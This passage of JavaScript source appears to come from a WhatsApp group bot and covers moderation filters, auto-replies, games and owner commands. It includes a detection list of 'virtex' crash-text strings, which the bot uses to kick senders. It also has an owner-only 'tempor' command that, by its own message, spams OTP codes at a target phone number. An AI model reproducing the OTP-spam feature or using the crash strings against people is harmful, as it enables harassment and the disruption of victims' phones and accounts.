        }
        
        //antiviewonce
    if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
    	if (m.isBaileys && m.fromMe) return
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await PrexzyVilla.sendMessage(m.chat, { forward: val }, { quoted: m })
    }
        //ANTI VIRUS
if (isGroup && db.data.chats[m.chat].antivirtex) {
if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (isGroupAdmins) return replygcprexzy('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
PrexzyVilla.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
if (!isBotAdmins) return
if(PrexzyTheCreator) return
PrexzyVilla.groupParticipantsUpdate(from, [sender], 'remove')
await PrexzyVilla.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
PrexzyVilla.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
 }
 }
 
 if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmin || !isBotAdmin){		  
        } else {
          replygcprexzy(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
    return await PrexzyVilla.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
 
        //anti media
        if (db.data.chats[m.chat].antimedia && isMedia) {
        if (PrexzyTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcprexzy(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
    return PrexzyVilla.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.data.chats[m.chat].image && isPrexzyMedia) {
    if(isPrexzyMedia === "imageMessage"){
        if (PrexzyTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcprexzy(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
    return PrexzyVilla.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antivideo && isPrexzyMedia) {
    if(isPrexzyMedia === "videoMessage"){
        if (PrexzyTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcprexzy(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
    return PrexzyVilla.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antisticker && isPrexzyMedia) {
    if(isPrexzyMedia === "stickerMessage"){
        if (PrexzyTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcprexzy(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
    return PrexzyVilla.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antiaudio && isPrexzyMedia) {
    if(isPrexzyMedia === "audioMessage"){
        if (PrexzyTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcprexzy(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
    return PrexzyVilla.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antipoll && isPrexzyMedia) {
    if(isPrexzyMedia === "pollCreationMessage"){
        if (PrexzyTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcprexzy(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
    return PrexzyVilla.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antilocation && isPrexzyMedia) {
    if(isPrexzyMedia === "locationMessage"){
        if (PrexzyTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcprexzy(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
    return PrexzyVilla.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antidocument && isPrexzyMedia) {
    if(isPrexzyMedia === "documentMessage"){
        if (PrexzyTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcprexzy(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
    return PrexzyVilla.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
      if (db.data.chats[m.chat].anticontact && isPrexzyMedia) {
    if(isPrexzyMedia === "contactMessage"){
        if (PrexzyTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcprexzy(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
    return PrexzyVilla.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        //respond
        if (db.data.chats[m.chat].badword) {
            for (let bak of bad) {
               if (budy === bak) {
                  let baduser = await db.data.users[sender].badword
                  PrexzyVilla.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			PrexzyVilla.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
               }
            }
        }
        //autosticker
        if (db.data.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                PrexzyVilla.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                PrexzyVilla.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
if (isAdmins) return replygcprexzy(bvl)
if (m.key.fromMe) return replygcprexzy(bvl)
if (PrexzyTheCreator) return replygcprexzy(bvl)
               await PrexzyVilla.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			PrexzyVilla.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return replygcprexzy(bvl)
if (m.key.fromMe) return replygcprexzy(bvl)
if (PrexzyTheCreator) return replygcprexzy(bvl)
               await PrexzyVilla.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			PrexzyVilla.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        //afk
        let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	     for (let jid of mentionUser) {
            let user = db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            replygcprexzy(`Please Don't Tag Him\nHe's AFK ${reason ? 'With reason ' + reason : 'no reason'}\nAfk Since ${clockString(new Date - afkTime)}`.trim())
        }
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            replygcprexzy(`You Have Returned From AFK\nAFK Reason: ${user.afkReason ? user.afkReason : ''}\nAFK Duration: ${clockString(new Date - user.afkTime)}`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
//total features
const prexzyfeature = () =>{
            var mytext = fs.readFileSync("./QueenNyx.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        //autoreply
for (let BhosdikaPrexzy of VoiceNotePrexzy) {
if (budy === BhosdikaPrexzy) {
let audiobuffy = fs.readFileSync(`./PrexzyMedia/audio/${BhosdikaPrexzy}.mp3`)
PrexzyVilla.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaPrexzy of StickerPrexzy){
if (budy === BhosdikaPrexzy){
let stickerbuffy = fs.readFileSync(`./PrexzyMedia/sticker/${BhosdikaPrexzy}.webp`)
PrexzyVilla.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaPrexzy of ImagePrexzy){
if (budy === BhosdikaPrexzy){
let imagebuffy = fs.readFileSync(`./PrexzyMedia/image/${BhosdikaPrexzy}.jpg`)
PrexzyVilla.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaPrexzy of VideoPrexzy){
if (budy === BhosdikaPrexzy){
let videobuffy = fs.readFileSync(`./PrexzyMedia/video/${BhosdikaPrexzy}.mp4`)
PrexzyVilla.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
PrexzyVilla.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaPrexzy of ApkPrexzy) {
if (budy === BhosdikaPrexzy) {
let buffer = fs.readFileSync(`./PrexzyMedia/apk/${BhosdikaPrexzy}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
PrexzyVilla.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaPrexzy of ZipPrexzy) {
if (budy === BhosdikaPrexzy) {
let buffer = fs.readFileSync(`./PrexzyMedia/zip/${BhosdikaPrexzy}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
PrexzyVilla.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaPrexzy of DocPrexzy) {
if (budy === BhosdikaPrexzy) {
let buffer = fs.readFileSync(`./PrexzyMedia/doc/${BhosdikaPrexzy}.pdf`)
senddocu(buffer)
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: PrexzyVilla.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, PrexzyVilla.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
PrexzyVilla.ev.emit('messages.upsert', msg)
}

//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd2) {
	if (m.key.fromMe) return
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await replygcprexzy(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else replygcprexzy('*Wrong Answer!*')
        }
        
        //game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // replygcprexzy(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                replygcprexzy({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) PrexzyVilla.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            PrexzyVilla.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    PrexzyVilla.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    PrexzyVilla.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) PrexzyVilla.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) PrexzyVilla.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) PrexzyVilla.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    PrexzyVilla.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    replygcprexzy(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) PrexzyVilla.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    replygcprexzy(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) PrexzyVilla.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    PrexzyVilla.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
        
        //user db
        if (isCommand && !isUser) {
prexzyverifieduser.push(sender)
fs.writeFileSync('./src/data/role/user.json', JSON.stringify(prexzyverifieduser, null, 2))
}
        
        switch (isCommand) {
            case 'addbadword': case 'addbd':
               if (!PrexzyTheCreator) return PrexzyStickOwner()
               if (!groupAdmins) return replygcprexzy(mess.admin)
               if (args.length < 1) return replygcprexzy( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
               bad.push(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               replygcprexzy('Successfully Added Bad Word!')
            break
            case 'delbadword': case 'deldb':
               if (!PrexzyTheCreator) return PrexzyStickOwner()
               if (!groupAdmins) return replygcprexzy(mess.admin)
               if (args.length < 1) return replygcprexzy( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
               bad.splice(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               replygcprexzy('Successfully Deleted Bad Word!')
            break 
            case 'resetuser':
            case 'resetdbuser': {
               if (!PrexzyTheCreator) return PrexzyStickOwner()
               let totalusernya = db.data.users[0]
               replygcprexzy(`Succesfully Deleted ${totalusernya} Users in Database`)
               db.data.users = []
            }
            break
            case 'resethit':
            case 'resettotalhit': {
               if (!PrexzyTheCreator) return PrexzyStickOwner()
               global.db.data.settings[botNumber].totalhit = 0
               replygcprexzy(mess.done)
            }
            break
            case 'setmenu':{
               if (!PrexzyTheCreator) return PrexzyStickOwner()
               if (!text) return replygcprexzy(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)\nPlease select one\nExample ${prefix + command} v1`)
               if (text.startsWith('v')) {
                  typemenu = text
                  replygcprexzy(mess.done)
               } else {
                  replygcprexzy(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)\nPlease select one\nExample ${prefix + command} v1`)
               }
            }
            break
            case 'setreply':{
               if (!PrexzyTheCreator) return PrexzyStickOwner()
               if (!text) return replygcprexzy(`There are 3 reply(v1,v2,v3)\nPlease select 1\nExample ${prefix+command} v1`)
               if (text.startsWith('v')) {
                  typereply = text
                  replygcprexzy(mess.done)
               } else {
                  replygcprexzy(`There are 3 reply(v1,v2,v3)\nPlease select 1\nExample ${prefix+command} v1`)
               }
            }
            break
            case 'statustext': 
            case 'upswteks': {
               if (!PrexzyTheCreator) return PrexzyStickOwner()
               if (!q) return replygcprexzy('Text?')
               await PrexzyVilla.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
               replygcprexzy(mess.done)
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!PrexzyTheCreator) return PrexzyStickOwner()
               if (/video/.test(mime)) {
                  var videosw = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
                  await PrexzyVilla.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users) })
                  await replygcprexzy(mess.done)
               } else {
       replygcprexzy('Reply to video')
               }
            }
            break             
            case 'tempor': {
    if (!PrexzyTheCreator) return PrexzyStickOwner();
    if (!q.includes('|')) return replygcprexzy(`Use: .tempor <country code>|<phone number>\nExample: .${command} +62|83754338986`);

    const countryCode = q.substring(0, q.indexOf('|') - 0);
    const targetNumber = q.substring(q.lastIndexOf('|') + 1);

    m.reply(`*Temporary Success*\nThe bot is spamming OTP. Please check the target number.\nType ${prefix}stoptempor to stop Temporary.`);
    await temporary(PrexzyVilla, m, countryCode, targetNumber, from);
}
break
case 'restart': case 'restartbot': case 'stoptempor': {
    m.reply(`Restarting ${command}, please wait...`);
    await sleep(2300);
    process.exit(1);
    m.reply(`Successfully restarted ${command}`);
}
break
case 'nyxpairing': {
    if (!text) return replygcprexzy('*<!> Example:* .nyxpairing 628xxx');
    if (!PrexzyTheCreator) return replygcprexzy('This command is for the Owner only.');
    if (m.isGroup) return replygcprexzy("Sorry, this feature can only be used in private chat.");

    await nyxpairing(PrexzyVilla, text, fkontak, from);
    let loli = '`';
    await sleep(4500);
    
    replygcprexzy(`*Enter the code below to become a temporary bot*\n\n1. Click the three dots in the top right corner.\n2. Tap "Linked Devices".\n3. Tap "Link a Device".\n4. Tap "Link with phone number only".\n5. Enter the code below.\n\nNote: The code may expire anytime!\n\nCode: ${loli}${global.codepairing}${loli}\nIf the code does not work, please delete the 'nyxpairing' folder.`);
}
break
case 'listnyxpairing': {
    if (!PrexzyTheCreator) return PrexzyStickOwner();
    try {
        let users = [...new Set([...global.conns.filter(danzz => danzz.user).map(danzz => danzz.user)])];
        let response = "*List of Paired Users*\n\n";
        
        for (let i of users) {
            let y = await PrexzyVilla.decodeJid(i.id);
            response += ` • User: @${y.split("@")[0]}\n`;
            response += ` • Name: ${i.name}\n\n`;
        }

        PrexzyVilla.sendMessage(from, { text: response, mentions: [y] }, { quoted: m });
    } catch (err) {
        replygcprexzy(`No users have paired yet.`);
    }
}
break
case 'stopnyxpairing': {
    if (!PrexzyTheCreator) return PrexzyStickOwner();
    replygcprexzy("Manually delete it, bro. The bot isn't that advanced yet. :v");
}
break
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!PrexzyTheCreator) return PrexzyStickOwner()
               if (/image/.test(mime)) {
                  var imagesw = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
                  await PrexzyVilla.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users)})
                  await replygcprexzy(mess.done)
               } else {
                  replygcprexzy('Reply to image')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!PrexzyTheCreator) return PrexzyStickOwner()
               if (/audio/.test(mime)) {
                  var audiosw = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
                  await PrexzyVilla.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.data.users)
                  })
                  await replygcprexzy(mess.done)
               } else {
                  replygcprexzy('Reply to audio')
               }
            }
            break
            case 'setimgmenu':
            case 'sim': {
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                let delb = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './PrexzyMedia/theme/nyxpic.jpg')
                fs.unlinkSync(delb)
                replygcprexzy(mess.done)
            }
            break
            case 'setvidmenu':
            case 'svm': 
            	case 'setvgifmenu':
            case 'sgm': {
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                let delb = await PrexzyVilla.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './PrexzyMedia/theme/Nyx-bot.mp4')
                fs.unlinkSync(delb)
                replygcprexzy(mess.done)
            }
            break
            case 'addtitle':{
               if (!PrexzyTheCreator) return PrexzyStickOwner()
               if (!text) return replygcprexzy(`Usage ${prefix + command} number|title`)
               nonya = text.split('|')[0]
               titlenya = text.split('|')[1]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = titlenya
               await replygcprexzy(mess.done)
            }
            break
